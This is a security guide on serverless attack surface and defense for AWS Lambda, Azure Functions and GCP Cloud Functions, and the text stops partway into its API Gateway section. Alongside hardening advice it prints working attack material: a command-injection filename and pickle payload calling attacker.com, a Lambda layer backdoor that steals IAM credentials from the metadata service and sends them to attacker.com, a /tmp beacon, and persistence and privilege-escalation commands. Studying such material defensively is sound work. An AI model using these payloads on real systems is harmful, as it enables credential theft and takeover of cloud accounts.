# Serverless Security

## Lambda, Functions, Cloud Functions — Attack Surface, Persistence, and Defense

---

## Table of Contents

1. [Serverless Architecture and Security Model](#1-serverless-architecture-and-security-model)
2. [Lambda/Functions Attack Surface](#2-lambdafunctions-attack-surface)
3. [Injection via Event Triggers](#3-injection-via-event-triggers)
4. [Persistence Patterns in Serverless](#4-persistence-patterns-in-serverless)
5. [Cold Start Timing Attacks](#5-cold-start-timing-attacks)
6. [Dependency Confusion in Serverless](#6-dependency-confusion-in-serverless)
7. [IAM Overprivilege in Function Roles](#7-iam-overprivilege-in-function-roles)
8. [VPC Configuration Issues](#8-vpc-configuration-issues)
9. [API Gateway as Attack Surface](#9-api-gateway-as-attack-surface)
10. [Event Injection Across Cloud Providers](#10-event-injection-across-cloud-providers)
11. [Serverless Security Hardening](#11-serverless-security-hardening)

---

## 1. Serverless Architecture and Security Model

### 1.1 The Serverless Execution Model

Serverless computing abstracts infrastructure management away from the developer. The cloud provider manages the runtime, scaling, and availability. This shifts the security boundary from infrastructure to code and configuration.

```
+------------------------------------------------------------------+
|                    Serverless Execution Model                      |
|                                                                    |
|  Event Sources                    Serverless Platform              |
|  ┌──────────┐ ┌──────────┐       ┌──────────────────────────┐   |
|  │ API      │ │ S3/Blob/ │       │                          │   |
|  │ Gateway  │ │ GCS Event│──→    │  Function Runtime         │   |
|  └────┬─────┘ └────┬─────┘       │  ┌────────────────────┐  │   |
|       │            │              │  │ Container/VM        │  │   |
|  ┌────┴─────┐ ┌────┴─────┐       │  │ ┌────────────────┐ │  │   |
|  │ SQS/     │ │ SNS/     │──→    │  │ │ Function Code  │ │  │   |
*  │ PubSub   │ │ EventGrid│       │  │ │ + Dependencies │ │  │   |
|  └────┬─────┘ └────┬─────┘       │  │ │ + Runtime      │ │  │   |
|       │            │              │  │ └────────────────┘ │  │   |
|  ┌────┴─────┐ ┌────┴─────┐       │  └────────────────────┘  │   |
|  │ DynamoDB │ │ CloudWatch│──→   │          │                │   |
|  │ Streams  │ │ Events   │       │          v                │   |
|  └────┬─────┘ └────┬─────┘       │  ┌────────────────────┐  │   |
|       │            │              │  │ IAM Role / Policy  │  │   |
|       v            v              │  └────────────────────┘  │   |
|  ┌──────────────────────────┐    │          │                │   |
|  │     Shared Responsibility │    │          v                │   |
*  │  Customer: Code, Config,  │    │  ┌────────────────────┐  │   |
|  │  IAM, Dependencies        │    │  │ Cloud Services     │  │   |
|  │  Provider: Runtime,       │    │  │ (S3, DynamoDB,    │  │   |
|  │  Scaling, Infrastructure   │    │  │  KMS, etc.)       │  │   |
|  └──────────────────────────┘    │  └────────────────────┘  │   |
|                                    └──────────────────────────┘   |
+------------------------------------------------------------------+
```

### 1.2 Shared Responsibility in Serverless

| Responsibility | AWS Lambda | Azure Functions | GCP Cloud Functions |
|---|---|---|---|
| **Function code** | Customer | Customer | Customer |
| **Dependencies** | Customer | Customer | Customer |
| **IAM permissions** | Customer | Customer | Customer |
| **Environment variables** | Customer | Customer | Customer |
| **VPC configuration** | Customer | Customer | Customer |
| **Event source configuration** | Customer | Customer | Customer |
| **Runtime** | AWS | Microsoft | Google |
| **Scaling** | AWS | Microsoft | Google |
| **Infrastructure** | AWS | Microsoft | Google |
| **Hypervisor** | AWS | Microsoft | Google |

### 1.3 Serverless Threat Model

The serverless threat model differs from traditional applications:

1. **No persistent runtime** — Functions are ephemeral, but state can persist in environment variables and layers
2. **Event-driven execution** — Every event source is a potential attack vector
3. **IAM is the primary access control** — Function IAM roles define the blast radius
4. **Cold starts create timing side channels** — Execution time can leak information
5. **Dependencies are a critical attack surface** — NPM/PyPI supply chain attacks
6. **The execution environment is shared** — Multi-tenant isolation depends on the cloud provider

---

## 2. Lambda/Functions Attack Surface

### 2.1 AWS Lambda Attack Surface

```
+------------------------------------------------------------------+
|                    Lambda Attack Surface Map                       |
|                                                                    |
|  ┌──────────────┐     ┌──────────────┐     ┌──────────────┐     |
|  │ API Gateway  │────→│ Lambda       │────→│ IAM Role     │     |
|  │ (HTTP)       │     │ Function     │     │ (permissions)│     |
|  └──────────────┘     │ (code+deps)  │     └──────┬───────┘     |
|  ┌──────────────┐     │              │            │              |
|  │ S3 Events    │────→│ Environment  │            │              |
|  │ (object put) │     │ Variables    │            │              |
|  └──────────────┘     │ (secrets!)   │            │              |
|  ┌──────────────┐     │              │            │              |
|  │ DynamoDB     │────→│ /tmp         │            │              |
|  │ Streams      │     │ (ephemeral   │            │              |
|  └──────────────┘     │  storage)    │            │              |
|  ┌──────────────┐     │              │            │              |
|  │ SNS/SQS      │────→│ Layers       │            │              |
|  │ (messages)   │     │ (shared libs) │            │              |
|  └──────────────┘     └──────────────┘            │              |
|                            │                       │              |
|                            v                       │              |
|  ┌──────────────────────────────────────────────────┐     |
|  │ Cloud Services Accessible via IAM Role           │     |
|  │ S3, DynamoDB, KMS, Secrets Manager, RDS, ...     │     |
|  └──────────────────────────────────────────────────┘     |
+------------------------------------------------------------------+
```

### 2.2 Lambda Function Anatomy

```python
# A typical Lambda function (Python)
import json
import boto3

def lambda_handler(event, context):
    # event: Input data from event source
    # context: Runtime information
    
    # DANGEROUS: Accessing secrets from environment variables
    db_password = os.environ['DB_PASSWORD']  # Exposed in Lambda configuration
    
    # DANGEROUS: Processing untrusted input without validation
    user_input = event['body']  # Could contain injection payloads
    
    # DANGEROUS: Using IAM role credentials from environment
    s3 = boto3.client('s3')  # Uses Lambda's execution role
    
    # DANGEROUS: Writing to /tmp persists across cold starts
    with open('/tmp/cache', 'w') as f:
        f.write('sensitive data')  # Persists across invocations!
    
    # DANGEROUS: Error messages leak implementation details
    try:
        result = process_data(user_input)
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})  # Stack trace leak!
        }
    
    return {
        'statusCode': 200,
        'body': json.dumps({'result': result})
    }
```

### 2.3 Lambda Environment Variable Exposure

```bash
# Lambda environment variables are accessible to the function code
# and can be exposed through SSRF, error messages, or debug endpoints

# Step 1: Identify Lambda function configuration
aws lambda get-function-configuration --function-name my-function
# Returns:
# {
#   "Environment": {
#     "Variables": {
#       "DB_PASSWORD": "SuperSecret123!",        # Never put secrets here!
#       "API_KEY": "sk-live-xxxx",               # Never put API keys here!
#       "S3_BUCKET": "my-production-bucket",      # Not sensitive but useful
#       "STAGE": "production"                     # Environment indicator
#     }
#   },
#   "Role": "arn:aws:iam::123456789012:role/lambda-execution-role"
# }

# Step 2: If the function is compromised, extract environment
# From inside a Lambda function:
import os
env_vars = dict(os.environ)
# AWS_LAMBDA_FUNCTION_NAME, AWS_LAMBDA_FUNCTION_VERSION
# AWS_LAMBDA_FUNCTION_MEMORY_SIZE, AWS_LAMBDA_FUNCTION_TIMEOUT
# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
# (These are the IAM role credentials!)
# Plus any custom environment variables (DB_PASSWORD, API_KEY, etc.)

# Step 3: Use the IAM role credentials
# The Lambda function has temporary credentials from its IAM role
# These can be used to access any AWS service the role permits
import boto3
s3 = boto3.client('s3')  # Uses Lambda's IAM role automatically
for bucket in s3.list_buckets()['Buckets']:
    print(bucket['Name'])
```

---

## 3. Injection via Event Triggers

### 3.1 Event Source Injection Taxonomy

| Event Source | Injection Vector | Typical Payload | Impact |
|---|---|---|---|
| **API Gateway** | HTTP request body/params | XSS, SQL injection, SSRF | Data theft, RCE |
| **S3 Events** | Object metadata/filename | Path traversal, command injection | RCE in Lambda |
| **SQS Messages** | Message body/attributes | Deserialization, JSON injection | RCE, DoS |
| **SNS Messages** | Message attributes | Injection, format string | Data corruption |
| **DynamoDB Streams** | Record data | NoSQL injection, type confusion | Data exfiltration |
| **CloudWatch Events** | Event detail | Command injection, policy injection | Privilege escalation |
| **Kinesis Streams** | Record data | Binary injection, buffer overflow | RCE in runtime |
| **Cognito triggers** | User attributes | LDAP injection, regex DoS | Auth bypass |

### 3.2 S3 Event Injection

```python
# Vulnerable Lambda function triggered by S3 events
import json
import boto3
import subprocess

def lambda_handler(event, context):
    # Get the S3 object key from the event
    bucket = event['Records'][0]['s3']['bucket']['name']
    key = event['Records'][0]['s3']['object']['key']
    
    # DANGEROUS: Using the key in a shell command without sanitization
    # An attacker can craft a filename that injects shell commands
    result = subprocess.run(
        f'process-file "{key}"',  # Command injection via filename!
        shell=True,
        capture_output=True
    )
    
    # An attacker uploads a file with the name:
    # "; curl http://attacker.com/exfil?data=$(env | base64) ; echo "
    # This would:
    # 1. Terminate the original command
    # 2. Execute arbitrary shell commands
    # 3. Exfiltrate Lambda environment variables (including IAM credentials)
    
    # Also dangerous: S3 object metadata can contain injection payloads
    s3 = boto3.client('s3')
    response = s3.head_object(Bucket=bucket, Key=key)
    content_type = response['ContentType']  # Attacker-controlled!
    
    return {'statusCode': 200, 'body': json.dumps({'result': result.stdout.decode()})}

# SECURE version:
def lambda_handler_secure(event, context):
    import re
    
    bucket = event['Records'][0]['s3']['bucket']['name']
    key = event['Records'][0]['s3']['object']['key']
    
    # Validate the key against a whitelist pattern
    if not re.match(r'^[a-zA-Z0-9/_-]+$', key):
        raise ValueError(f"Invalid S3 key: {key}")
    
    # Use subprocess without shell=True
    result = subprocess.run(
        ['process-file', key],
        capture_output=True
    )
    
    return {'statusCode': 200, 'body': json.dumps({'success': True})}
```

### 3.3 SQS Message Injection

```python
# Vulnerable Lambda processing SQS messages
import json
import pickle
import base64

def lambda_handler(event, context):
    for record in event['Records']:
        # DANGEROUS: Deserializing untrusted data
        message_body = record['body']
        
        # Pickle deserialization RCE
        data = pickle.loads(base64.b64decode(message_body))
        # An attacker sends: pickle.dumps(os.system('curl attacker.com'))
        
        # JSON injection
        config = json.loads(message_body)
        # An attacker sends malformed JSON that exploits
        # JSON parser differences (e.g., duplicate keys)
        
        # Template injection
        template = f"Processing: {config['name']}"
        # If 'name' contains Jinja2/Python template syntax
        
        return {'statusCode': 200}
    
# SECURE version:
def lambda_handler_secure(event, context):
    for record in event['Records']:
        message_body = record['body']
        
        # Use JSON schema validation
        import jsonschema
        
        schema = {
            "type": "object",
            "properties": {
                "name": {"type": "string", "maxLength": 100, "pattern": "^[a-zA-Z0-9 ]+$"},
                "action": {"type": "string", "enum": ["process", "validate", "transform"]}
            },
            "required": ["name", "action"],
            "additionalProperties": False
        }
        
        try:
            data = json.loads(message_body)
            jsonschema.validate(data, schema)
        except (json.JSONDecodeError, jsonschema.ValidationError) as e:
            raise ValueError(f"Invalid message: {e}")
            
        return {'statusCode': 200}
```

### 3.4 API Gateway Injection

```python
# Vulnerable Lambda behind API Gateway
import json
import urllib.parse

def lambda_handler(event, context):
    # DANGEROUS: Using unsanitized query parameters
    query_params = event.get('queryStringParameters', {})
    user_input = query_params.get('username', '')
    
    # SQL Injection
    # If this input feeds into a SQL query:
    # username = "' OR 1=1 --" → bypasses authentication
    
    # SSRF via Lambda
    # If the Lambda makes outgoing HTTP requests:
    import urllib.request
    url = f"https://internal-api.company.com/users/{user_input}"
    response = urllib.request.urlopen(url)
    # user_input = "../../metadata" → SSRF to internal services
    # user_input = "169.254.169.254/latest/meta-data/" → AWS metadata
    
    # Command injection in downstream services
    # If user_input is passed to a shell command or subprocess
    
    # Header injection (API Gateway doesn't strip all headers)
    x_forwarded_for = event.get('headers', {}).get('X-Forwarded-For', '')
    # An attacker can inject arbitrary headers
    
    return {'statusCode': 200, 'body': json.dumps({'user': user_input})}
```

---

## 4. Persistence Patterns in Serverless

### 4.1 Why Persistence Matters in Serverless

Serverless functions are ephemeral — they spin up, execute, and spin down. However, persistence is still possible through:

1. **Lambda layers** — shared library code injected into functions
2. **Environment variables** — persist across function versions
3. **/tmp directory** — persists across cold starts
4. **IAM role manipulation** — modifying function permissions
5. **Event source mapping** — adding new triggers
6. **Lambda function code** — modifying the function itself
7. **API Gateway configuration** — modifying routes and integrations

### 4.2 Lambda Layer Persistence

```python
# Attack: Modify a Lambda layer to inject code into all functions using it
# 
# Lambda layers are ZIP archives that provide shared libraries and code
# If an attacker can modify a layer, they inject code into every function
# that uses that layer

# Step 1: Download the existing layer
aws lambda get-layer-version \
  --layer-name my-shared-libs \
  --version-number 1 \
  --query 'Content.Location' \
  --output text | xargs curl -o layer.zip

# Step 2: Unzip and add a backdoor
mkdir layer && cd layer
unzip ../layer.zip

# Add a backdoor to a commonly imported module
cat > python/backdoor.py << 'EOF'
import os
import urllib.request

# This code runs when the function imports the layer
# It exfiltrates IAM credentials via the metadata service
try:
    # Get IAM credentials
    token = urllib.request.Request('http://169.254.169.254/latest/api/token', method='PUT', headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
    token_response = urllib.request.urlopen(token)
    imds_token = token_response.read().decode()
    
    role_name = urllib.request.urlopen(urllib.request.Request('http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers={'X-aws-ec2-metadata-token': imds_token})).read().decode()
    creds = urllib.request.urlopen(urllib.request.Request(f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}', headers={'X-aws-ec2-metadata-token': imds_token})).read().decode()
    
    # Exfiltrate credentials
    urllib.request.urlopen(f'https://attacker.com/exfil?data={creds}')
except:
    pass  # Silent failure to avoid detection
EOF

# Step 3: Rezip and publish a new layer version
zip -r ../layer-backdoored.zip .
aws lambda publish-layer-version \
  --layer-name my-shared-libs \
  --zip-file fileb://../layer-backdoored.zip \
  --compatible-runtimes python3.9

# Step 4: Update functions to use the new layer version
aws lambda update-function-configuration \
  --function-name target-function \
  --layers arn:aws:lambda:us-east-1:123456789012:layer:my-shared-libs:2
```

### 4.3 /tmp Persistence

```python
# Lambda's /tmp directory persists across cold starts
# This creates a persistence mechanism and can also be a data leak vector

import os
import json

def lambda_handler(event, context):
    # Write to /tmp (persists across invocations in the same cold start container)
    cache_file = '/tmp/function_cache.json'
    
    # Check if cache exists from a previous invocation
    if os.path.exists(cache_file):
        with open(cache_file, 'r') as f:
            cache = json.load(f)
    else:
        cache = {}
    
    # This is both a feature (caching) and a risk (data persistence)
    # An attacker who achieves code execution once can:
    # 1. Plant a backdoor in /tmp that runs on every cold start
    # 2. Store stolen data in /tmp for later retrieval
    # 3. Modify cached data to affect function behavior
    
    # Example: Planting a backdoor
    backdoor_path = '/tmp/.hidden_backdoor.py'
    if not os.path.exists(backdoor_path):
        with open(backdoor_path, 'w') as f:
            f.write('import os\nos.system("curl https://attacker.com/beacon")\n')
    
    # Example: Modifying Python's module search path
    site_packages = '/tmp/.site-packages'
    os.makedirs(site_packages, exist_ok=True)
    # If an attacker can write a .pth file here, Python will import it
    with open(os.path.join(site_packages, 'backdoor.pth'), 'w') as f:
        f.write('import os; os.system("id")\n')
    
    return {'statusCode': 200}
```

### 4.4 Cloud-Specific Persistence Mechanisms

```bash
# AWS Lambda Persistence:
# 1. Modify function code
aws lambda update-function-code --function-name my-function --zip-file fileb://backdoored.zip

# 2. Add environment variable with payload
aws lambda update-function-configuration \
  --function-name my-function \
  --environment '{"Variables":{"PYTHONSTARTUP":"/tmp/.backdoor.py"}}'

# 3. Add a Lambda layer (see above)

# 4. Modify IAM role permissions
aws iam put-role-policy \
  --role-name lambda-execution-role \
  --policy-name expanded-permissions \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# 5. Add new event source mapping (trigger Lambda on new events)
aws lambda create-event-source-mapping \
  --function-name my-function \
  --event-source-arn arn:aws:sqs:us-east-1:123456789012:my-queue \
  --batch-size 1

# Azure Functions Persistence:
# 1. Deploy a new function with backdoored code
az functionapp deployment source config-zip --src backdoored.zip -g resourceGroup -n functionAppName

# 2. Modify function app settings (environment variables)
az functionapp config appsettings set -g resourceGroup -n functionAppName --settings BACKDOOR=true

# 3. Add a managed identity with broad permissions
az functionapp identity assign -g resourceGroup -n functionAppName

# GCP Cloud Functions Persistence:
# 1. Update function source code
gcloud functions deploy my-function --source-path=./backdoored --trigger-http

# 2. Add environment variable
gcloud functions deploy my-function --set-env-vars BACKDOOR=true --trigger-http

# 3. Modify service account permissions
gcloud projects add-iam-policy-binding my-project \
  --member="serviceAccount:my-function@my-project.iam.gserviceaccount.com" \
  --role="roles/editor"
```

---

## 5. Cold Start Timing Attacks

### 5.1 Cold Start Architecture

```
+------------------------------------------------------------------+
|                    Lambda Cold Start Lifecycle                    |
|                                                                    |
|  Cold Start:                Warm Start:                            |
|  ┌──────────┐               ┌──────────┐                          |
|  │ Download │               │ Reuse    │                          |
*  │ Function │               │ existing │                          |
|  │ Code     │               │ container│                          |
*  └────┬─────┘               └────┬─────┘                          |
|       │                          │                                |
|       v                          v                                |
|  ┌──────────┐               ┌──────────┐                          |
|  │ Initialize│               │ Execute  │                          |
|  │ Runtime   │               │ Handler  │                          |
|  │ (Python,  │               └──────────┘                          |
|  │ Node.js)  │                                                      |
|  └────┬─────┘                                                       |
|       │                                                             |
|       v                                                              |
|  ┌──────────┐                                                        |
|  │ Load      │                                                        |
|  │ Dependencies│ (layer imports)                                      |
|  └────┬─────┘                                                        |
|       │                                                             |
|       v                                                              |
|  ┌──────────┐                                                        |
|  │ Execute   │                                                        |
|  │ Handler   │                                                        |
|  └──────────┘                                                        |
|                                                                    |
|  Cold start latency: 100ms - 10s+ (depends on runtime, dependencies)|
|  Warm start latency: 1ms - 100ms                                    |
+------------------------------------------------------------------+
```

### 5.2 Timing Side Channel Attacks

```python
# Timing attack: Extract secrets by measuring function execution time
#
# The key insight is that cold starts and warm starts have different timing
# profiles. By observing the execution time, an attacker can:
# 1. Determine if a function is being actively used (warm start = recent use)
# 2. Infer function configuration (memory allocation affects cold start time)
# 3. Extract secrets character-by-character (classic timing attack)

import time
import json

def lambda_handler(event, context):
    # VULNERABLE: Secret comparison with timing side channel
    api_key = event.get('api_key', '')
    stored_key = os.environ['SECRET_API_KEY']  # 32-character hex key
    
    # DANGEROUS: String comparison leaks timing information
    if api_key == stored_key:  # Timing depends on first differing character!
        return {'statusCode': 200, 'body': json.dumps({'auth': 'success'})}
    else:
        return {'statusCode': 401, 'body': json.dumps({'auth': 'failed'})}
    
    # An attacker can extract the key character by character:
    # 1. Send "a0000000000000000000000000000000" → 401 (0.5ms compare time)
    # 2. Send "b0000000000000000000000000000000" → 401 (0.5ms compare time)
    # 3. Send "c0000000000000000000000000000000" → 401 (0.7ms compare time)
    #    (Longer time = more characters matched before difference)
    # 4. Key starts with "c" — try "ca000000000000000000000000000000"
    # 5. Continue until full key is extracted
    
    # SECURE: Constant-time comparison
    import hmac
    if hmac.compare_digest(api_key.encode(), stored_key.encode()):
        return {'statusCode': 200, 'body': json.dumps({'auth': 'success'})}
    else:
        return {'statusCode': 401, 'body': json.dumps({'auth': 'failed'})}
```

### 5.3 Cold Start as Covert Channel

```python
# Cold start behavior can be used as a covert communication channel
# between co-located Lambda functions

# Function A: Sender (forces cold starts to send bits)
def sender(event, context):
    target_function = event['target']
    bit_value = event['bit']
    
    # Signal '1' by causing cold start of target function
    # (by updating its configuration to force re-initialization)
    if bit_value == '1':
        lambda_client.update_function_configuration(
            FunctionName=target_function,
            Description=f'Covert channel signal at {time.time()}'
        )
    # Signal '0' by not causing a cold start (do nothing)

# Function B: Receiver (observes cold starts to receive bits)
def receiver(event, context):
    start_time = context.get_remaining_time_in_millis()
    
    # Measure initial latency to determine if we're in a cold start
    # Cold start + full initialization = 500ms+
    # Warm start = 10ms
    
    # If this invocation took > 500ms, we received a '1'
    # If this invocation took < 100ms, we received a '0'
    
    processing_time = (context.get_remaining_time_in_millis() - start_time)
    bit_received = '1' if processing_time > 200 else '0'
    
    return {'statusCode': 200, 'bit': bit_received}
```

---

## 6. Dependency Confusion in Serverless

### 6.1 The Dependency Confusion Attack

Dependency confusion (also called substitution attack) exploits package managers' resolution logic to install malicious packages instead of intended ones.

```
+------------------------------------------------------------------+
|                    Dependency Confusion Attack                     |
|                                                                    |
|  Developer's Package Manager Resolution:                          |
|                                                                    |
|  requirements.txt:                                                |
|    my-company-utils==1.0.0   (private, internal)                  |
|    requests==2.28.0          (public, PyPI)                       |
|    numpy==1.23.0             (public, PyPI)                       |
|                                                                    |
|  Package Manager Resolution Logic:                                 |
|  1. Check private registry for my-company-utils → NOT FOUND       |
|     (or private registry not configured for Lambda)               |
|  2. Check public PyPI for my-company-utils → FOUND!              |
|     (attacker published malicious package with same name)         |
|  3. Install attacker's my-company-utils from public PyPI          |
|                                                                    |
|  Attack Variation:                                                 |
|  - Higher version number attack (1.0.0 private vs 99.0.0 public)  |
|  - Namespace collision (different case, hyphens vs underscores)    |
|  - Typosquatting (reqeusts vs requests)                           |
+------------------------------------------------------------------+
```

### 6.2 Lambda-Specific Dependency Confusion

```python
# Lambda deployment package: function.zip
# 
# function.zip contains:
#   lambda_function.py  (handler code)
#   requests/            (public dependency)
#   my_company_utils/    (private dependency - but where from?)
#
# If my_company_utils is NOT vendored in the ZIP package,
# Lambda will try to import it from the layer or installed packages.
# If the dependency is specified in requirements.txt but not vendored:
# 
# Option 1 (INSECURE): Use pip install during build
#   → pip may resolve from public PyPI if private registry is not configured
#   → Attacker's package gets installed
#
# Option 2 (SECURE): Vendor all dependencies in the deployment package
#   → All dependencies are included in the ZIP, no runtime resolution

# Lambda Layer dependency confusion
# If a Lambda layer specifies:
#   /opt/python/requirements.txt
# and Lambda's runtime resolves packages from this file at import time,
# an attacker can publish a package with the same name to PyPI.

# pip configuration artifact:
# If Lambda's build process uses:
pip install --extra-index-url https://pypi.org/simple/ \
            --index-url https://my-private-registry.com/simple/ \
            -r requirements.txt

# The --extra-index-url allows PyPI packages to OVERRIDE private packages
# if the attacker's package has a higher version number.

# SECURE: Use --index-url for private registry only, or vendor all deps
pip download -r requirements.txt -d dependencies/
# Then include all downloaded wheels in the Lambda deployment package
```

### 6.3 Preventing Dependency Confusion

```bash
# Prevention strategy for Lambda functions:

# 1. Vendor all dependencies
pip install -r requirements.txt -t ./package
cd package && zip -r ../function.zip .
cd .. && zip function.zip lambda_function.py

# 2. Use pip with --no-deps during build
pip install --no-deps -r requirements.txt -t ./package

# 3. Verify package integrity
pip install --require-hashes -r requirements.txt

# requirements.txt with hashes:
# my-company-utils==1.0.0 --hash=sha256:abc123...
# requests==2.28.0 --hash=sha256:def456...

# 4. Use AWS CodeArtifact for private package management
aws codeartifact create-domain --domain my-company
aws codeartifact create-repository --domain my-company --repository private-pypi

# 5. Configure pip to use private registry exclusively
# pip.conf:
[global]
index-url = https://my-company-123456789012.d.codeartifact.us-east-1.amazonaws.com/pypi/private-pypi/simple/
extra-index-url =  # EMPTY - do not fall back to public PyPI

# 6. Use container-based Lambda builds for consistent environments
FROM public.ecr.aws/lambda/python:3.9
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
CMD ["lambda_function.lambda_handler"]
```

---

## 7. IAM Overprivilege in Function Roles

### 7.1 The Overprivilege Problem

Lambda functions are frequently assigned overly permissive IAM roles. This is because:

1. Developers copy roles from other functions rather than creating least-privilege roles
2. AWS generates suggested policies that are often too broad
3. It's difficult to determine the exact permissions a function needs
4. Functions often need to access multiple services, leading to broad policies

```json
// BAD: Overly permissive Lambda IAM role
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:*", "dynamodb:*", "sns:*", "sqs:*", "logs:*"],
    "Resource": "*"
  }]
}
// This function can read/write ANY S3 bucket, ANY DynamoDB table,
// publish to ANY SNS topic, etc.
}

// GOOD: Least-privilege Lambda IAM role
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": ["arn:aws:s3:::my-specific-bucket/data/*"]
    },
    {
      "Effect": "Allow",
      "Action": ["dynamodb:PutItem"],
      "Resource": ["arn:aws:dynamodb:us-east-1:123456789012:table/my-table"]
    },
    {
      "Effect": "Allow",
      "Action": ["logs:CreateLogGroup", "logs:CreateLogStream", "logs:PutLogEvents"],
      "Resource": ["arn:aws:logs:us-east-1:123456789012:log-group:/aws/lambda/my-function:*"]
    }
  ]
}
```

### 7.2 IAM Privilege Escalation via Lambda

```bash
# If a Lambda function has iam:PassRole permission,
# an attacker can escalate by creating a new function with that role

# Step 1: Identify Lambda functions with overprivileged roles
aws lambda list-functions --query 'Functions[*].{Name:FunctionName,Role:Role}' --output table

# Step 2: Examine the role's permissions
aws iam list-attached-role-policies --role-name lambda-execution-role
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 3: If a function has broad permissions, exploit them
# Example: Function has s3:* on all buckets
aws lambda invoke --function-name overprivileged-function \
  --cli-binary-input '{"bucket": "production-secrets", "key": "database-password"}' \
  response.json

# Step 4: Create a new function with the same role
aws lambda create-function \
  --function-name backdoor \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/overprivileged-role \
  --handler lambda_function.handler \
  --zip-file fileb://backdoor.zip

# Step 5: Invoke the backdoor function to access resources
aws lambda invoke --function-name backdoor response.json
```

### 7.3 Privilege Escalation via Environment Variables

```python
# Lambda function with overprivileged role and exposed environment variables
import os
import boto3
import json

def lambda_handler(event, context):
    # The function's IAM role has more permissions than needed
    # If this function is invoked by a user with limited permissions,
    # they can use this function as a proxy to access resources they
    # couldn't otherwise access
    
    # User passes the resource they want to access
    bucket = event.get('bucket', os.environ.get('DEFAULT_BUCKET'))
    key = event.get('key', '')
    
    # The function's role has s3:* on all buckets
    s3 = boto3.client('s3')
    obj = s3.get_object(Bucket=bucket, Key=key)
    data = obj['Body'].read().decode()
    
    # This effectively allows any caller to read from any S3 bucket
    # that the function's role has access to
    return {'statusCode': 200, 'body': data}
```

---

## 8. VPC Configuration Issues

### 8.1 Lambda VPC Architecture

```
+------------------------------------------------------------------+
|                    Lambda VPC Configuration                        |
|                                                                    |
|  Internet Access:                                                  |
|  ┌────────────────┐                   ┌────────────────┐          |
|  │ Lambda without  │ ───────────────→ │ Internet        │          |
|  │ VPC            │                   │ (direct access) │          |
*  └────────────────┘                   └────────────────┘          |
|                                                                    |
|  ┌────────────────┐                   ┌────────────────┐          |
|  │ Lambda in VPC  │ ──→ NAT Gateway ──→ │ Internet        │          |
|  │ (with NAT)     │    (required for) │ (via NAT)       │          |
|  └───────┬────────┘    outbound)       └────────────────┘          |
|          │                                                        |
|          └──→ VPC Endpoint ──→ AWS Services (S3, DynamoDB, etc.)  |
|                                                                    |
|  ┌────────────────┐                                               |
|  │ Lambda in VPC  │  ← CANNOT access internet or AWS services     |
|  │ (without NAT)  │    unless VPC endpoints are configured!       |
*  └────────────────┘                                               |
+------------------------------------------------------------------+
```

### 8.2 Common VPC Misconfigurations

```bash
# Misconfiguration 1: Lambda in VPC without NAT Gateway
# Result: Function cannot access internet or AWS services
# This causes timeouts on external API calls

# Misconfiguration 2: Lambda in VPC without VPC endpoints
# Result: Function cannot access S3, DynamoDB, etc.
# Traffic goes: Lambda → VPC → Internet (blocked) → AWS service (fails)

# Misconfiguration 3: Lambda in public subnet
# Result: Function cannot be assigned a public IP (Lambdas don't get public IPs)
# No internet access even in public subnet without NAT

# Misconfiguration 4: Insufficient ENI capacity
# Result: Function fails to initialize with "ENI limit exceeded" error
# Lambda needs one ENI per concurrent execution in the VPC

# Secure VPC configuration for Lambda:
aws lambda create-function-configuration \
  --function-name my-function \
  --vpc-config SubnetIds=subnet-xxx,subnet-yyy,SecurityGroupIds=sg-zzz

# The security group should:
# 1. Allow outbound to NAT Gateway (for internet access)
# 2. Allow outbound to VPC endpoints (for AWS services)
# 3. Deny inbound from all sources
# 4. Deny outbound to 169.254.169.254 (metadata service)
```

### 8.3 VPC Endpoint Security

```json
// VPC Endpoint Policy for S3 (restrict Lambda access)
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::123456789012:role/lambda-execution-role"},
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": [
      "arn:aws:s3:::my-allowed-bucket/*"
    ]
  }, {
    "Effect": "Deny",
    "Principal": "*",
    "Action": "s3:*",
    "Resource": "*",
    "Condition": {
      "StringNotEquals": {
        "aws:PrincipalArn": "arn:aws:iam::123456789012:role/lambda-execution-role"
      }
    }
  }]
}
```

---

## 9. API Gateway as Attack Surface

### 9.1 API Gateway Security Model

```
+------------------------------------------------------------------+
|                    API Gateway Security                            |
|                                                                    |
|  Client Request                                                    |
|       │                                                            |
|       v                                                            |
|  ┌─────────────────────────────────────────────────────────┐      |
|  │                   API Gateway                            │      |
|  │                                                          │      |
|  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │      |
|  │  │ Authorizer  │  │ Request     │  │ Throttling  │     │      |
|  │  │ (Lambda/Cog│  │ Validation  │  │ & Rate Limit│     │      |
|  │  │  nito)      │  │             │  │             │     │      |
*  │  └─────────────┘  └─────────────┘  └─────────────┘     │      |
|  │         │                │                │              │      |
|  │         v                v                v              │      |
|  │  ┌─────────────────────────────────────────────────┐    │      |
|  │  │            Integration Request                   │    │      |
|  │  │  (header mapping, body mapping, parameters)      │    │      |
|  │  └─────────────────────────────────────────────────┘    │      |
|  │         │                                                │      |
|  │         v                                                │      |
|  │  ┌────────────┐  ┌────────────┐  ┌────────────┐       │      |
|  │  │ Lambda     │  │ HTTP       │  │ Mock       │       │      |
|  │  │ Integration│  │ Integration│  │ Integration│       │      |
|  │  └────────────┘  └────────────┘  └────────────┘       │      |
|  └─────────────────────────────────────────────────────────┘      |
+------------------------------------------------------------------+
```

### 9.2 API Gateway Attack Vectors

```bash
# Attack 1: Bypass API Gateway authorization
# If the Lambda function URL is exposed directly (without API Gateway),
# it may bypass the authorizer

# Check for direct Lambda function URLs:
aws lambda get-function-url-config --function-name my-function
# If FunctionUrlConfig is present, the function may be accessible
# without going through the API Gateway authorizer

